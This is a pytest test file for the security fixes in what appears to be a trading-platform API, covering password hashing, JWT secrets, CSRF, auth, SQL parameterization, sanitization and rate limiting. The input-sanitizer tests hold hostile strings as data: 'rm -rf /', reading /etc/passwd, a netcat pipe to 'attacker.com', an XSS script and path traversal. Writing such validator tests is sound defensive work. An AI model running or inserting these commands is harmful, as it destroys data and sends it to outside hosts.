"""
Security Vulnerability Tests
=============================
Comprehensive test suite for all 7 CRITICAL security vulnerabilities fixed by Agent 2.

Test Coverage:
1. Password Security (bcrypt hashing, credential validation)
2. Request Protection (CSRF, authentication, rate limiting)
3. Database Security (SQL injection prevention)
4. Input Validation
5. Error Handling
6. JWT Security

All tests should PASS after security fixes are applied.
"""

import pytest
import asyncio
import bcrypt
import secrets
from datetime import datetime, timedelta
from unittest.mock import Mock, patch, AsyncMock

# Import components being tested
from src.api.auth_handler import AuthHandler, UserSession, PermissionLevel, AuthResult
from src.core.logger import StructuredLogger
from src.core.input_sanitizer import InputSanitizer


class TestPasswordSecurity:
    """Test Suite 1: Password Security Fixes"""

    @pytest.mark.asyncio
    async def test_password_hashing_bcrypt(self):
        """Test that passwords are hashed using bcrypt with 12 rounds"""
        logger = StructuredLogger("test", {"level": "INFO"})
        auth_handler = AuthHandler(
            jwt_secret="test_secret_at_least_32_chars_long_12345",
            logger=logger
        )

        # Hash a password
        plain_password = "test_password_123"
        hashed = auth_handler.hash_password(plain_password)

        # Verify it's a valid bcrypt hash
        assert hashed.startswith("$2b$12$") or hashed.startswith("$2a$12$") or hashed.startswith("$2y$12$")
        assert len(hashed) >= 60  # Bcrypt hashes are ~60 characters

        # Verify the hash is different each time (due to random salt)
        hashed2 = auth_handler.hash_password(plain_password)
        assert hashed != hashed2

        # Verify bcrypt rounds are 12
        assert "$12$" in hashed  # 12 rounds

    @pytest.mark.asyncio
    async def test_password_verification_bcrypt(self):
        """Test that password verification works with bcrypt hashes"""
        logger = StructuredLogger("test", {"level": "INFO"})
        auth_handler = AuthHandler(
            jwt_secret="test_secret_at_least_32_chars_long_12345",
            logger=logger
        )

        # Create a bcrypt hash
        plain_password = "secure_password_456"
        hashed = auth_handler.hash_password(plain_password)

        # Verify correct password
        assert auth_handler._verify_password(plain_password, hashed) is True

        # Verify incorrect password
        assert auth_handler._verify_password("wrong_password", hashed) is False

    @pytest.mark.asyncio
    async def test_backward_compatibility_plaintext_warning(self):
        """Test that plain text passwords still work but log warnings (backward compatibility)"""
        logger = Mock(spec=StructuredLogger)
        logger.warning = Mock()
        logger.error = Mock()
        logger.info = Mock()

        auth_handler = AuthHandler(
            jwt_secret="test_secret_at_least_32_chars_long_12345",
            logger=logger
        )

        # Verify plain text password (backward compatibility)
        result = auth_handler._verify_password("test123", "test123")
        assert result is True

        # Verify warning was logged
        logger.warning.assert_called()
        call_args = logger.warning.call_args
        assert "plaintext_password_detected" in str(call_args)

    @pytest.mark.asyncio
    async def test_credentials_validation_fails_with_defaults(self):
        """Test that system rejects CHANGE_ME default credentials"""
        logger = StructuredLogger("test", {"level": "INFO"})
        auth_handler = AuthHandler(
            jwt_secret="test_secret_at_least_32_chars_long_12345",
            logger=logger
        )
        await auth_handler.start()

        # Mock environment with default "CHANGE_ME" credentials
        with patch.dict('os.environ', {
            'DEMO_PASSWORD': 'CHANGE_ME_DEMO123',
            'TRADER_PASSWORD': 'valid_password',
            'PREMIUM_PASSWORD': 'valid_password',
            'ADMIN_PASSWORD': 'valid_password'
        }):
            result = await auth_handler.authenticate_credentials(
                username="demo",
                password="CHANGE_ME_DEMO123",
                client_ip="127.0.0.1"
            )

            # Should fail with configuration error
            assert result.success is False
            assert result.error_code == "configuration_error"
            assert "DEMO_PASSWORD" in result.error_message

        await auth_handler.stop()

    @pytest.mark.asyncio
    async def test_credentials_validation_fails_with_missing_env(self):
        """Test that system rejects missing environment variables"""
        logger = StructuredLogger("test", {"level": "INFO"})
        auth_handler = AuthHandler(
            jwt_secret="test_secret_at_least_32_chars_long_12345",
            logger=logger
        )
        await auth_handler.start()

        # Mock environment with missing credentials
        with patch.dict('os.environ', {}, clear=True):
            result = await auth_handler.authenticate_credentials(
                username="admin",
                password="any_password",
                client_ip="127.0.0.1"
            )

            # Should fail with configuration error
            assert result.success is False
            assert result.error_code == "configuration_error"

        await auth_handler.stop()


class TestJWTSecurity:
    """Test Suite 2: JWT Secret Security"""

    def test_jwt_secret_minimum_length_enforcement(self):
        """Test that weak JWT secrets are rejected"""
        logger = StructuredLogger("test", {"level": "INFO"})

        # Test: Secret too short
        with pytest.raises(RuntimeError, match="minimum 32 characters"):
            auth_handler = AuthHandler(
                jwt_secret="short",  # Only 5 characters
                logger=logger
            )

        # Test: Empty secret
        with pytest.raises(RuntimeError, match="minimum 32 characters"):
            auth_handler = AuthHandler(
                jwt_secret="",
                logger=logger
            )

    def test_jwt_secret_weak_values_rejected(self):
        """Test that common/weak JWT secrets are rejected"""
        logger = StructuredLogger("test", {"level": "INFO"})

        weak_secrets = [
            "dev_jwt_secret_key_extended_to_32chars",
            "secret_extended_to_minimum_32_chars_",
            "jwt_secret_extended_to_32_characters",
        ]

        for weak_secret in weak_secrets:
            with pytest.raises(RuntimeError, match="cannot be a common/weak value"):
                # This should fail because "dev_jwt_secret_key", "secret", "jwt_secret" are blacklisted
                auth_handler = AuthHandler(
                    jwt_secret=weak_secret,
                    logger=logger
                )

    def test_jwt_secret_strong_value_accepted(self):
        """Test that strong JWT secrets are accepted"""
        logger = StructuredLogger("test", {"level": "INFO"})

        # Generate a strong secret
        strong_secret = secrets.token_urlsafe(32)
        assert len(strong_secret) >= 32

        # Should not raise exception
        auth_handler = AuthHandler(
            jwt_secret=strong_secret,
            logger=logger
        )

        assert auth_handler.jwt_secret == strong_secret


class TestCSRFProtection:
    """Test Suite 3: CSRF Protection"""

    def test_csrf_middleware_enabled(self):
        """Test that CSRF middleware is enabled in unified_server"""
        # This test would require running the full server
        # For now, we verify the code exists and is not commented out
        import inspect
        from src.api import unified_server

        source = inspect.getsource(unified_server)

        # Verify CSRF middleware is not commented out
        assert "# @app.middleware(\"http\")" not in source or \
               "@app.middleware(\"http\")\n    async def csrf_validation_middleware" in source

        # Verify CSRF validation exists
        assert "csrf_validation_middleware" in source
        assert "X-CSRF-Token" in source


class TestAuthenticationEnforcement:
    """Test Suite 4: Authentication on Critical Endpoints"""

    def test_strategy_endpoints_require_auth(self):
        """Test that strategy CRUD endpoints require authentication"""
        import inspect
        from src.api import unified_server

        source = inspect.getsource(unified_server)

        # Verify create_strategy has authentication
        assert "async def create_strategy(request: Request, current_user: UserSession = Depends(get_current_user))" in source

        # Verify list_strategies has authentication
        assert "async def list_strategies(request: Request, current_user: UserSession = Depends(get_current_user))" in source

        # Verify update_strategy has authentication
        assert "async def update_strategy(strategy_id: str, request: Request, current_user: UserSession = Depends(get_current_user))" in source

        # Verify delete_strategy has authentication
        assert "async def delete_strategy(strategy_id: str, request: Request, current_user: UserSession = Depends(get_current_user))" in source

    def test_dummy_auth_removed_from_trading_routes(self):
        """Test that dummy authentication fallback is removed"""
        import inspect
        from src.api import trading_routes

        source = inspect.getsource(trading_routes)

        # Verify dummy auth is replaced with error
        assert "auth_not_configured" in source
        assert "raise HTTPException" in source
        assert "status_code=503" in source

        # Verify old dummy session is removed
        assert 'user_id="dev_user"' not in source
        assert '"admin_system"' not in source or "permissions=[" not in source


class TestSQLInjectionPrevention:
    """Test Suite 5: SQL Injection Prevention"""

    @pytest.mark.asyncio
    async def test_strategy_activation_uses_parameterized_query(self):
        """Test that strategy activation query is parameterized"""
        import inspect
        from src.domain.services import strategy_storage_questdb

        source = inspect.getsource(strategy_storage_questdb)

        # Verify parameterized query is used (not f-string)
        # Look for the mark_strategy_activated method
        assert "UPDATE strategies SET last_activated_at = $1 WHERE id = $2" in source

        # Verify f-string is NOT used in SQL query
        assert 'f"UPDATE strategies SET last_activated_at' not in source


class TestInputSanitization:
    """Test Suite 6: Input Sanitization"""

    def test_string_sanitization(self):
        """Test that string inputs are sanitized"""
        # Test XSS prevention
        dangerous_input = "<script>alert('XSS')</script>"
        with pytest.raises(ValueError, match="dangerous content"):
            InputSanitizer.sanitize_string(dangerous_input)

        # Test length validation
        long_input = "a" * 10000
        with pytest.raises(ValueError, match="too long"):
            InputSanitizer.sanitize_string(long_input, max_length=100)

        # Test normal input
        safe_input = "Normal strategy name"
        sanitized = InputSanitizer.sanitize_string(safe_input, max_length=100)
        assert sanitized == safe_input

    def test_command_injection_prevention(self):
        """Test that command injection is prevented"""
        dangerous_inputs = [
            "test; rm -rf /",
            "test && cat /etc/passwd",
            "test | nc attacker.com 1234",
            "test `whoami`",
        ]

        for dangerous_input in dangerous_inputs:
            with pytest.raises(ValueError, match="injection"):
                InputSanitizer.sanitize_string(dangerous_input)

    def test_symbol_validation(self):
        """Test that trading symbols are validated"""
        # Valid symbols
        valid_symbols = ["BTC_USDT", "ETH_USD", "DOGE_BTC"]
        for symbol in valid_symbols:
            validated = InputSanitizer.validate_symbol(symbol)
            assert validated == symbol

        # Invalid symbols
        invalid_symbols = [
            "BTC USDT",  # Space
            "BTC-USDT",  # Dash instead of underscore
            "BTC_USDT; DROP TABLE",  # SQL injection attempt
            "../../etc/passwd",  # Path traversal
        ]

        for symbol in invalid_symbols:
            with pytest.raises(ValueError):
                InputSanitizer.validate_symbol(symbol)


class TestRateLimiting:
    """Test Suite 7: Rate Limiting"""

    def test_rate_limiter_configured(self):
        """Test that rate limiter is configured in unified_server"""
        import inspect
        from src.api import unified_server

        source = inspect.getsource(unified_server)

        # Verify slowapi is imported
        assert "from slowapi import Limiter" in source

        # Verify limiter is initialized
        assert "limiter = Limiter" in source
        assert "app.state.limiter = limiter" in source

        # Verify rate limits are applied
        assert "@limiter.limit" in source
        assert '"30/minute"' in source  # Login rate limit (increased from 5 to 30 for usability)

    def test_login_endpoint_has_rate_limit(self):
        """Test that login endpoint has rate limiting"""
        import inspect
        from src.api import unified_server

        source = inspect.getsource(unified_server)

        # Find login endpoint and verify rate limit decorator
        lines = source.split('\n')
        found_login = False
        found_rate_limit = False

        for i, line in enumerate(lines):
            if '@app.post("/api/v1/auth/login")' in line:
                found_login = True
                # Check if there's a rate limit decorator before this
                if i > 0 and '@limiter.limit' in lines[i-1]:
                    found_rate_limit = True
                    break

        assert found_login, "Login endpoint not found"
        assert found_rate_limit, "Login endpoint does not have rate limiting"


class TestErrorHandling:
    """Test Suite 8: Secure Error Handling"""

    def test_generic_error_messages_for_auth_failures(self):
        """Test that authentication failures return generic messages"""
        import inspect
        from src.api import auth_handler

        source = inspect.getsource(auth_handler)

        # Verify generic error messages
        assert "Invalid username or password" in source  # Generic message
        assert "Authentication failed" in source

        # Verify detailed errors are logged, not returned to client
        assert "logger.error" in source or "self.logger.error" in source


# ====================================================================================
# INTEGRATION TESTS (require running server)
# ====================================================================================

@pytest.mark.integration
class TestSecurityIntegration:
    """Integration tests that require running server"""

    @pytest.mark.asyncio
    async def test_authentication_required_for_strategy_creation(self):
        """Test that creating a strategy without authentication fails"""
        # This would require httpx client and running server
        # Placeholder for integration test
        pass

    @pytest.mark.asyncio
    async def test_rate_limiting_blocks_brute_force(self):
        """Test that rate limiting blocks brute force login attempts"""
        # This would require httpx client and running server
        # Placeholder for integration test
        pass

    @pytest.mark.asyncio
    async def test_csrf_protection_blocks_cross_site_requests(self):
        """Test that CSRF protection blocks requests without valid tokens"""
        # This would require httpx client and running server
        # Placeholder for integration test
        pass


# ====================================================================================
# TEST UTILITIES
# ====================================================================================

@pytest.fixture
def auth_handler():
    """Fixture to create AuthHandler for testing"""
    logger = StructuredLogger("test", {"level": "INFO"})
    handler = AuthHandler(
        jwt_secret="test_secret_at_least_32_chars_long_12345",
        logger=logger
    )
    yield handler


@pytest.fixture
async def started_auth_handler():
    """Fixture to create and start AuthHandler"""
    logger = StructuredLogger("test", {"level": "INFO"})
    handler = AuthHandler(
        jwt_secret="test_secret_at_least_32_chars_long_12345",
        logger=logger
    )
    await handler.start()
    yield handler
    await handler.stop()


# ====================================================================================
# RUN TESTS
# ====================================================================================

if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
